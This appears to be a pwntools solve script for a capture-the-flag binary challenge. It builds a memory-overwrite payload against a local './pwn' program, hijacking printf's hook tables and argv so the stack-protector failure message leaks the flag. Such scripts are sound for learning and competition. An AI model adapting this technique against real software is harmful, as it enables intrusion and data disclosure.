from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b''

start = 0x6B73E0
argv = 0x6B7980
printf_arginfo_table = 0x6B7AA8
printf_function_table = 0x6B7A28
stack_chk_fail = 0x4359B0
flag_addr = 0x6B4040

pay = p64(flag_addr)
pay = pay.ljust(ord('s')*8, b'\x00') + p64(stack_chk_fail)
pay = pay.ljust(argv-start, b'\x00') + p64(start)
pay = pay.ljust(printf_function_table-start, b'\x00') + p64(0xdeadbeef)
pay = pay.ljust(printf_arginfo_table-start, b'\x00') + p64(start)

sl(pay)

#debug()
sh()
